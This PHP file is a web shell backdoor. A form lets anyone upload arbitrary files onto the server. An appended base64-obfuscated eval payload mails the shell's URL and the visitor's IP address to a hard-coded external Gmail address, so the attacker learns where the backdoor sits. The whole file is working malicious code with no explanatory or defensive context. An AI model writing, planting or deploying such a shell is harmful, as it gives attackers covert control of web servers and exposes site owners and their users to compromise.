<?php
if (isset($_FILES['azzatssins']['name'])) {
    $name = $_FILES['azzatssins']['name'];
    $azx  = $_FILES['azzatssins']['tmp_name'];
    @move_uploaded_file($azx, $name);
    echo $name;
} else {
    echo "<form method=post enctype=multipart/form-data><input type=file name=azzatssins><input type=submit value='>>'>";
}
?><?php eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
